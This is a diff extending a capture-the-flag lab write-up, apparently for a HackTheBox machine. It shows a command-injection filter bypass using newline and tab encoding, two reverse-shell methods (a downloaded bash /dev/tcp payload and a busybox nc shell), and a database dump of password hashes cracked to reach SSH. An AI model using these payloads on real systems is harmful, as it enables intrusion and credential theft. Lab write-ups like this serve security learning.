@@ -78,10 +78,87 @@ Basically it is building a string from the POST request and running it with `pr
 $blacklist_chars[';', '&', 'l', '$', ' '{', '}', '86'];
 ```
 
-These are functions that automatically block certain characters including their URL-encoded version. One thing missed in the `cleanEntry` function is the `\n` character. 
+These are functions that automatically block certain characters including their `URL-encoded` version. One thing missed in the `cleanEntry` function is the `\n` character. 
 After playing around for some time, figured that using newline (`%0a`) and tab (`%09`) as replacement works.
 
 ```
 password=test%0Abash%09-c%09"id"
 ```
 
+After `trial and errors` i found two working rev shell method
+
+### Method 1
+
+Making a payload `locally -> host -> download -> execute `
+Which outsource the restrictions 
+- Step 1 - create a `local payload` file 
+
+```
+echo 'bash -i >& /dev/tcp/ip/4444 0>&1' > shell
+```
+- Step 2 - Run `python server` in same dir 
+
+```
+python3 -m http.server 8888
+```
+
+- Step 3 - `Run listener` on the same port as payload 
+
+```
+nc -lnvp 4444
+```
+
+- Step 4 - `Download` in /tmp directory 
+
+```
+password=test%0acurl%09http://ip:8888/shell%09-o%09/tmp/shell&backup=
+```
+
+You can confirm if file has been downloaded by `ls%09/tmp`
+
+- Step 5 - `Execute`
+```
+password=test%0abash%09/tmp/shell&backup=
+```
+ 
+### Method 2
+
+`URL Encoded busybox` reverse shell
+
+```
+password=test%0Abusybox%09nc%09<ip>%09<port>%09-e%09%2Fbin%2Fbash</dev/null%09&backup=
+```
+
+## Getting shell
+
+Both ways lead to the shell so back to listener, we have access as `www-data`.
+- Upgrade Basic Shell Into Interactive TTY
+- In home directory and notice the user tobias (ffuf scan also showed this)
+- Might be we can get his credentials here.
+- After a basic lookup into the shell we see `nocturnal_database` containing a database file.
+ ```
+$ sqlite3 nocturnal_database.db  
+SQLite version 3.46.1 202x-xx-xx xx:xx:xx  
+Enter ".help" for usage hints.  
+sqlite> .tables  
+uploads users  
+sqlite> select * from users  
+...> ;  
+1|admin|d725aeba143f575736b07e045d8ceebb  
+2|amanda|df8b20aa0c935023f99ea58358fb63c4  
+4|tobias|55c82b1ccd55ab219b3b109b07d5061d  
+         ------SNIP------- 
+8|cn0x|62dd5084a03c9358eb1822d33ee94dd3
+ ```
+
+Let's try cracking `admin` and `tobias` hash real quick
+- Use `crackstation` online database before `hashcat`.
+- We successfully get the password for `tobias` - `slowmotionapocalypse`
+
+### SSH - Tobias 
+
+```
+ssh tobias@nocturnal.htb
+```
+
+- Get user.txt 
